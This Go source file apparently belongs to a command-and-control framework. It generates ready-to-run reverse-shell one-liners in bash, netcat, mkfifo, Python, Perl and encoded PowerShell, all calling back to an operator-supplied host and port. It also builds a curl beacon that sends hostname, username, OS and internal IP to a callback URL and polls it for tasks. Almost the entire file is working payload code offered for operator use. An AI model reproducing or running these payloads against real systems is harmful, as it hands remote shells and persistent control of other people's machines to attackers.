package c2

import (
	"encoding/json"
	"fmt"
	"net/url"
	"strings"

	"cyberstrike-ai/internal/database"
)

// OnelinerKind identifies the language or format of a one-liner payload.
type OnelinerKind string

const (
	OnelinerBash       OnelinerKind = "bash"        // bash reverse shell (TCP reverse listener)
	OnelinerNc         OnelinerKind = "nc"          // netcat reverse shell
	OnelinerNcMkfifo   OnelinerKind = "nc_mkfifo"   // bidirectional mkfifo pipe (for nc builds without -e)
	OnelinerPython     OnelinerKind = "python"      // Python socket reverse shell
	OnelinerPerl       OnelinerKind = "perl"        // Perl reverse shell
	OnelinerPowerShell OnelinerKind = "powershell"  // PowerShell TCP reverse shell (IEX style)
	OnelinerCurl       OnelinerKind = "curl_beacon" // periodic HTTP beacon polling via curl (binary-free)
)

// AllOnelinerKinds returns all supported one-liner kinds.
func AllOnelinerKinds() []OnelinerKind {
	return []OnelinerKind{
		OnelinerBash, OnelinerNc, OnelinerNcMkfifo,
		OnelinerPython, OnelinerPerl,
		OnelinerPowerShell, OnelinerCurl,
	}
}

// tcpOnelinerKinds lists raw TCP reverse-shell kinds supported only by tcp_reverse listeners.
var tcpOnelinerKinds = map[OnelinerKind]bool{
	OnelinerBash:       true,
	OnelinerNc:         true,
	OnelinerNcMkfifo:   true,
	OnelinerPython:     true,
	OnelinerPerl:       true,
	OnelinerPowerShell: true,
}

// httpOnelinerKinds lists kinds supported by http_beacon / https_beacon listeners.
var httpOnelinerKinds = map[OnelinerKind]bool{
	OnelinerCurl: true,
}

// OnelinerKindsForListener returns the one-liner kinds compatible with listenerType.
func OnelinerKindsForListener(listenerType string) []OnelinerKind {
	switch ListenerType(listenerType) {
	case ListenerTypeTCPReverse:
		return []OnelinerKind{
			OnelinerBash, OnelinerNc, OnelinerNcMkfifo,
			OnelinerPython, OnelinerPerl, OnelinerPowerShell,
		}
	case ListenerTypeHTTPBeacon, ListenerTypeHTTPSBeacon, ListenerTypeWebSocket:
		return []OnelinerKind{OnelinerCurl}
	default:
		return nil
	}
}

// IsOnelinerCompatible reports whether kind is compatible with listenerType.
func IsOnelinerCompatible(listenerType string, kind OnelinerKind) bool {
	switch ListenerType(listenerType) {
	case ListenerTypeTCPReverse:
		return tcpOnelinerKinds[kind]
	case ListenerTypeHTTPBeacon, ListenerTypeHTTPSBeacon, ListenerTypeWebSocket:
		return httpOnelinerKinds[kind]
	default:
		return false
	}
}

// OnelinerInput holds parameters for generating a one-liner payload.
type OnelinerInput struct {
	Kind         OnelinerKind
	Host         string // callback host (IP or domain)
	Port         int    // listener port
	HTTPBaseURL  string // used by HTTP/HTTPS Beacon, e.g. https://x.com
	ImplantToken string // HTTP Beacon authentication token
}

// ValidateOnelinerForListener checks whether kind matches the listener configuration (e.g. tcp_reverse requires encrypted Beacons by default).
func ValidateOnelinerForListener(listener *database.C2Listener, kind OnelinerKind) error {
	if listener == nil {
		return fmt.Errorf("listener is nil")
	}
	if ListenerType(listener.Type) == ListenerTypeTCPReverse && tcpOnelinerKinds[kind] {
		cfg := &ListenerConfig{}
		if strings.TrimSpace(listener.ConfigJSON) != "" {
			_ = json.Unmarshal([]byte(listener.ConfigJSON), cfg)
		}
		if !cfg.AllowLegacyShell {
			return fmt.Errorf("The listener does not have allow_legacy_shell enabled: tcp_reverse accepts only CSB1-encrypted Beacons (AES-GCM + Token) by default. Generate a beacon with build, or enable allow_legacy_shell explicitly (not recommended on public networks)")
		}
	}
	return nil
}

// GenerateOneliner generates a one-liner payload string.
// Design notes:
//   - Avoids dependencies beyond the target interpreter required by the chosen kind (bash/python/perl/etc.);
//   - Avoids nested-quote pitfalls by using base64/URL encoding where appropriate;
//   - Produces ready-to-run commands that can be presented directly to operators.
func GenerateOneliner(in OnelinerInput) (string, error) {
	host := strings.TrimSpace(in.Host)
	if err := ValidateBeaconDialHost(host); err != nil {
		return "", err
	}
	switch in.Kind {
	case OnelinerBash:
		if err := SafeBindPort(in.Port); err != nil {
			return "", err
		}
		// Wrap with bash -c so it works when invoked from non-bash shells like zsh or sh.
		// /dev/tcp is a bash-specific pseudo-device that must be interpreted by bash.
		return fmt.Sprintf(`bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1'`, host, in.Port), nil

	case OnelinerNc:
		if err := SafeBindPort(in.Port); err != nil {
			return "", err
		}
		return fmt.Sprintf(`nc -e /bin/sh %s %d`, host, in.Port), nil

	case OnelinerNcMkfifo:
		if err := SafeBindPort(in.Port); err != nil {
			return "", err
		}
		// Bidirectional mkfifo form compatible with nc/openbsd-nc builds lacking -e.
		return fmt.Sprintf(
			`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %d >/tmp/f`,
			host, in.Port,
		), nil

	case OnelinerPython:
		if err := SafeBindPort(in.Port); err != nil {
			return "", err
		}
		// Base64-encode the Python snippet before exec to avoid single/triple-quote escaping issues in python -c.
		py := fmt.Sprintf(
			`import socket,os,pty;s=socket.socket();s.connect(("%s",%d));[os.dup2(s.fileno(),x) for x in (0,1,2)];pty.spawn("/bin/sh")`,
			host, in.Port,
		)
		// Wrap in base64 to avoid target shell quoting issues.
		return fmt.Sprintf(
			`python3 -c "import base64,sys;exec(base64.b64decode('%s').decode())"`,
			b64StdEncode(py),
		), nil

	case OnelinerPerl:
		if err := SafeBindPort(in.Port); err != nil {
			return "", err
		}
		return fmt.Sprintf(
			`perl -e 'use Socket;$i="%s";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
			host, in.Port,
		), nil

	case OnelinerPowerShell:
		if err := SafeBindPort(in.Port); err != nil {
			return "", err
		}
		// PowerShell TCP reverse shell without legacy .NET dependencies.
		ps := fmt.Sprintf(
			`$c=New-Object System.Net.Sockets.TcpClient('%s',%d);$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$o2=$o+'PS '+(pwd).Path+'> ';$by=([text.encoding]::ASCII).GetBytes($o2);$s.Write($by,0,$by.Length);$s.Flush()};$c.Close()`,
			host, in.Port,
		)
		return fmt.Sprintf(
			`powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand %s`,
			utf16LEBase64(ps),
		), nil

	case OnelinerCurl:
		if strings.TrimSpace(in.HTTPBaseURL) == "" {
			return "", fmt.Errorf("http_base_url is required for curl_beacon")
		}
		if strings.TrimSpace(in.ImplantToken) == "" {
			return "", fmt.Errorf("implant_token is required for curl_beacon")
		}
		base := strings.TrimRight(in.HTTPBaseURL, "/")
		return fmt.Sprintf(
			`bash -c 'H="X-Implant-Token: %s";`+
				`URL="%s";`+
				`HN=$(hostname 2>/dev/null||echo unknown);`+
				`UN=$(whoami 2>/dev/null||echo unknown);`+
				`OS=$(uname -s 2>/dev/null||echo unknown);`+
				`AR=$(uname -m 2>/dev/null||echo unknown);`+
				`IP=$(hostname -I 2>/dev/null|awk "{print \$1}"||echo "");`+
				`ST=$(od -An -N32 -tx1 /dev/urandom|tr -d " \n");[ ${#ST} -eq 64 ]||exit 1;SH="X-Session-Token: $ST";SID="";`+
				`while :;do `+
				`BODY="{\"hostname\":\"$HN\",\"username\":\"$UN\",\"os\":\"$OS\",\"arch\":\"$AR\",\"internal_ip\":\"$IP\",\"pid\":$$}";`+
				`R=$(curl -fsSk -H "$H" -H "$SH" -H "Content-Type: application/json" -X POST "$URL/check_in" -d "$BODY" 2>/dev/null);`+
				`if [ -n "$R" ]&&[ -z "$SID" ];then SID=$(echo "$R"|grep -o "\"session_id\":\"[^\"]*\""|head -1|cut -d"\"" -f4);fi;`+
				`if [ -n "$SID" ];then `+
				`T=$(curl -fsSk -H "$H" -H "$SH" -G "$URL/tasks?session_id=$SID" 2>/dev/null);`+
				`fi;`+
				`sleep 5;`+
				`done' &`,
			in.ImplantToken, base,
		), nil
	}
	return "", fmt.Errorf("unsupported oneliner kind: %s", in.Kind)
}

// urlEncodeForShell URL-encodes a string so special characters do not break shell escaping.
func urlEncodeForShell(s string) string {
	return url.QueryEscape(s)
}
